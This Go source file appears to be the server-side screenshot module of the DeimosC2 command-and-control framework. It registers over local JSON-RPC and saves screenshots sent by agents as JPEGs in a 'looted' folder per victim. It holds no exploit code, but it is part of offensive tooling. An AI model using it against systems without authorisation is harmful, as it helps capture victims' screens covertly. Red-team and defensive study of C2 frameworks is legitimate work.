package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	"log"
	"net"
	"net/rpc"
	"net/rpc/jsonrpc"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"sync"
	"time"

	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/DeimosC2/DeimosC2/lib/modulescommon"
)

//ModData is used for RPC
type ModData int

var wg sync.WaitGroup

var rpcPort = 63002

//Module is the datastructure of modules
type Module struct {
	Name string //Holds the name of the module
	Port int    //Holds the RPC port of the module server
}

func startModuleServer() {
	logging.Logger.Println("Modules RPC server starting up")
	modRPC := new(ModData)
	rpc.Register(modRPC)
	rpc.HandleHTTP()
	var l net.Listener
	var e error
	for {
		s := strconv.Itoa(rpcPort)
		l, e = net.Listen("tcp", "127.0.0.1:"+s)
		if e == nil {
			break
		}
		rpcPort++
	}
	wg.Add(1)
	//go http.Serve(l, nil)
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}

		go rpc.ServeCodec(jsonrpc.NewServerCodec(conn))
	}

}

//RecData will take in data to be acted on from the server
func (t *ModData) RecData(data modulescommon.ModuleCom, reply *string) error {
	logging.Logger.Println("RecData called!")
	r := server(data)
	logging.Logger.Println(r)
	*reply = r
	return nil
}

//EndServer will be called in order to end the module
func (t *ModData) EndServer(end bool, reply *bool) error {
	logging.Logger.Println("EndServer called!")
	if end == true {
		defer wg.Done()
	}
	return nil
}

func server(data modulescommon.ModuleCom) string {
	logging.Logger.Println(data)
	cwd, err := os.Getwd()
	if err != nil {
		fmt.Printf("%s", err)
	}
	//cwd = filepath.Dir(filepath.Dir(filepath.Dir(filepath.Dir(filepath.Dir(cwd)))))
	fullPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", (time.Now().Format("20060102150405.000") + ".jpg"))
	logging.Logger.Println(fullPath)
	img, _, _ := image.Decode(bytes.NewReader(data.Data))
	fileName := fmt.Sprintf(fullPath)
	file, _ := os.Create(fileName)
	defer file.Close()
	//pass img back in order to just send the data
	//need to convert this somehow (aka need to take a look and see wtf it is)
	jpeg.Encode(file, img, nil)
	//Reply with the what should be sent back to the front end in this case it will be the file location
	newMsg := modulescommon.ModOutput{
		AgentKey:   data.AgentKey,
		ModuleName: data.ModuleName,
		OutputType: "Link",
		Output:     []byte(filepath.Base(fullPath)),
	}
	msg, _ := json.Marshal(newMsg)
	return string(msg)
}

//The correct RPC port needs to be specified in order for the module to work
//this is passed as a commandline command on module startup
func main() {
	port := os.Args[1]
	//Starts up the local RPC server to recieve data
	go startModuleServer()
	logging.Logger.Println("connecting")
	//Makes the connection to the main server
	conn, err := net.Dial("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatal("dialing:", err)
	}

	defer conn.Close()

	client := jsonrpc.NewClient(conn)

	m := Module{"screengrab", rpcPort}

	logging.Logger.Println("Checking in..")
	var reply []byte
	//Registers with the main server
	err = client.Call("ModData.ModInit", m, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

	//Waits till the module is finished
	wg.Wait()
}
